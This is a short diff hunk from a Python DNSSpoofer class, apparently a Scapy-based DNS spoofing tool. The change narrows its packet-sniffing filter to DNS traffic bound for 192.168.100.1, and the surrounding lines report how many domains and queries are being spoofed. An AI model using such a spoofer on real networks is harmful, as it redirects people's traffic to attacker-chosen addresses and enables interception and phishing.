@@ -54,7 +54,7 @@ class DNSSpoofer:
         print(f"Spoofing {len(self.target_domains)} domains to {self.spoof_ip}")
         
         try:
-            sniff(iface=self.interface, filter="udp port 53", 
+            sniff(iface=self.interface, filter="udp and port 53 and dst host 192.168.100.1", 
                   prn=self.process_packet, store=False)
         except KeyboardInterrupt:
             print(f"\nSpoofed {self.queries_spoofed} queries")
